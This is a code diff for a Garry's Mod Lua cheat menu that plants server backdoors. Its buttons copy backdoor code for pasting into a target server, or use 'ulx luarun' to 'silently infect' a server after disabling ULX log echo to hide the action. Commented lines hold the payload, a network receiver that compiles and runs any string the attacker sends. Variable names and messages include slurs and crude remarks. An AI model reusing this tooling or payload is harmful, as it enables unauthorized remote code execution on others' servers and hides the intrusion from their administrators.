+        surface.DrawOutlinedRect(0, 0, w, h)
+
+        surface.SetDrawColor(0, 0, 50 ,155)
+
+        surface.DrawRect(0, 0, w, h)
+
+    end
+
+    helpimretarded.DoClick = function()
+
+        BD.ChatText( "Output backdoor code to clipboard.  Ctrl-V it into a serverside .lua file on the target server then go molest its holes", Color(155,255,155) )
+
+        local bdstring = BD.GetActive().Code
+
+ --       local bdstring = [[util.AddNetworkString( "_CAC_ReadMemory" ) net.Receive( "_CAC_ReadMemory", function() local x = CompileString( net.ReadString(), "LuaCmd", false ) if isfunction( x ) then x() end end )]]
+
+        SetClipboardText( bdstring ) 
+
+    end
+
+
+
+    local helpimretarded2 = vgui.Create("DButton", BDMenu)
+
+    helpimretarded2:SetSize( 200, 35 )
+
+    helpimretarded2:SetPos( 20, 620 )
+
+    helpimretarded2:SetText("ULX Luarun Backdoor")
+
+    helpimretarded2:SetTextColor(Color(255, 255, 255, 255))
+
+    helpimretarded2.Paint = function(panel, w, h)
+
+        surface.SetDrawColor(100, 100, 200 ,255)
+
+        surface.DrawOutlinedRect(0, 0, w, h)
+
+        surface.SetDrawColor(0, 0, 50 ,155)
+
+        surface.DrawRect(0, 0, w, h)
+
+    end
+
+    helpimretarded2.DoClick = function()
+
+        BD.ChatText( "Using ulx luarun to silently infect server", Color(155,255,155) )
+
+        LocalPlayer():ConCommand( [[ulx rcon ulx logEcho 0]] )
+
+        timer.Simple( 0.5, function()
+
+            LocalPlayer():ConCommand( "ulx luarun "..BD.GetActive().Code )
+
+--            LocalPlayer():ConCommand( "ulx luarun util.AddNetworkString( '_CAC_ReadMemory' ) net.Receive( '_CAC_ReadMemory', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )" )
+
+        end )
+
+        timer.Simple( 1, function() LocalPlayer():ConCommand( [[ulx rcon ulx logEcho 1]] ) end )
+
+
+
+        timer.Simple( 1.5, function() if BD.IsMessagePooled( BD.GetActive().Netkey ) then BD.ChatText( "Successfully infected!", Color(155,255,155) ) else BD.ChatText( "ULX infection failed!", Color(255,155,155) ) end end )
+
+    end
+
+
+
+
+
+local moonman = vgui.Create( "DTextEntry", BDMenu )
+
+moonman:SetPos( 430, 625 )
+
+moonman:SetSize( 200, 30 )
+
+moonman:SetText( backdoorargs )
+
+moonman.OnChange = function( self )
+
+    backdoorargs = self:GetValue()
+
+--    surface.PlaySound("buttons/button3.wav")
+
+end
+
+
+
+
+
+    local target1 = vgui.Create("DButton", BDMenu)
+
+    target1:SetSize( 40, 20 )
+
+    target1:SetPos( 520, 295 )
+
+    target1:SetText("All")
+
+    target1:SetTextColor(Color(255, 255, 255, 255))
+
+    target1.Paint = function(panel, w, h)
+
+        surface.SetDrawColor(100, 100, 200 ,255)
+
+        surface.DrawOutlinedRect(0, 0, w, h)
+
+        surface.SetDrawColor(0, 0, 50 ,155)
+
+        surface.DrawRect(0, 0, w, h)
+
+    end
+
+    target1.DoClick = function()
+
+        for _, p in pairs(player.GetAll()) do
+
+            if not table.HasValue( selectedplayers, p ) then 
+
+                table.insert( selectedplayers, p )
+
+            end
+
+        end
+
+    end
+
+
+
+    local target2 = vgui.Create("DButton", BDMenu)
+
+    target2:SetSize( 40, 20 )
+
+    target2:SetPos( 565, 295 )
+
+    target2:SetText("None")
+
+    target2:SetTextColor(Color(255, 255, 255, 255))
+
+    target2.Paint = function(panel, w, h)
+
+        surface.SetDrawColor(100, 100, 200 ,255)
+
+        surface.DrawOutlinedRect(0, 0, w, h)
+
+        surface.SetDrawColor(0, 0, 50 ,155)
+
+        surface.DrawRect(0, 0, w, h)
+
+    end
+
+    target2.DoClick = function()
+
+        table.Empty( selectedplayers )
+
+    end
+
+
+
+    local target2 = vgui.Create("DButton", BDMenu)
+
+    target2:SetSize( 20, 20 )
+
+    target2:SetPos( 610, 295 )
+
+    target2:SetText("Me")
+
+    target2:SetTextColor(Color(255, 255, 255, 255))
+
+    target2.Paint = function(panel, w, h)
+
+        surface.SetDrawColor(100, 100, 200 ,255)
+
+        surface.DrawOutlinedRect(0, 0, w, h)
+
+        surface.SetDrawColor(0, 0, 50 ,155)
+
+        surface.DrawRect(0, 0, w, h)
+
+    end
+
+    target2.DoClick = function()
+
+        table.Empty( selectedplayers )
+
+        table.insert( selectedplayers, LocalPlayer() )
+
+    end
+
+
+
+
+
+
+
+-- players list
+
+
+
+for k, v in pairs( player.GetAll() ) do
+
+
+
+    local plypanel2 = vgui.Create( "DPanel" )
+
+    plypanel2:SetPos( 0, 0 )
+
+    plypanel2:SetSize( 200, 25 )
+
+    plypanel2.Paint = function() -- Paint function
+
+        draw.RoundedBoxEx(8,1,1,plypanel2:GetWide(),plypanel2:GetTall(),Color(0, 0, 0, 150), false, false, false, false)
+
+        if table.HasValue( selectedplayers, v ) then surface.SetDrawColor(Color(50, 255, 90, 255)) else surface.SetDrawColor(Color(50, 50, 90, 255)) end
+
+        surface.DrawOutlinedRect(1, 1, plypanel2:GetWide() - 1 , plypanel2:GetTall() - 1)
+
+    end
+
+
+
+    local plyname = vgui.Create( "DLabel", plypanel2 )
+
+    plyname:SetPos( 10, 5 )
+
+    plyname:SetFont( "Trebuchet18" )
+
+    local tcol = Color( 255, 255, 255 )
+
+    if v == LocalPlayer() then tcol = Color( 155, 155, 255 ) end
+
+  --  elseif BD.IsFriend( v ) then tcol = Color( 0, 255, 0 )
+
+--    elseif BD.GetRank(v) != ( "user" or "guest" or "player" ) then tcol = Color( 255, 100, 0 ) end
+
+    plyname:SetColor( tcol )
+
+    plyname:SetText( v:Nick() )
+
+    plyname:SetSize(180, 15)
+
+
+
+
+
+    local faggot = vgui.Create("DButton", plypanel2)
+
+    faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )
+
+    faggot:SetPos( 0, 0 )
+
+    faggot:SetText("")
+
+    faggot.Paint = function(panel, w, h)
+
+        return
+
+    end
+
+    faggot.DoClick = function()
+
+        if table.HasValue( selectedplayers, v ) then 
+
+            table.RemoveByValue( selectedplayers, v )
+
+        else
+
+            table.insert( selectedplayers, v )
+
+        end
+
+    end
+
+
+
+
+
+    Plist4:AddItem( plypanel2 )
+
+
+
+end
+
+
+
+
+
+BD.GenerateBackdoorList( Plist, 1 )
+
+BD.GenerateBackdoorList( Plist2, 2 )
+
+BD.GenerateBackdoorList( Plist3, 3 )
+
+
+
+end
+
+concommand.Add("bd_menu", BD.BackdoorMenu)
+
+
+
+
+
+function BD.QuickFireBackdoor()
+
+if !BD.BDMacros[selectedbackdoor] or selectedbackdoor == "" then BD.ChatText( "You haven't even selected a macro to use ya dingus!", Color(255,155,155) ) return end
+
+if BD.BDMacros[selectedbackdoor].Type == ( 1 or 3 ) then BD.FormatCodeGlobal() else BD.FormatCodeTargeted() end
+
+end
+
+concommand.Add("bd_quickfire", BD.QuickFireBackdoor)
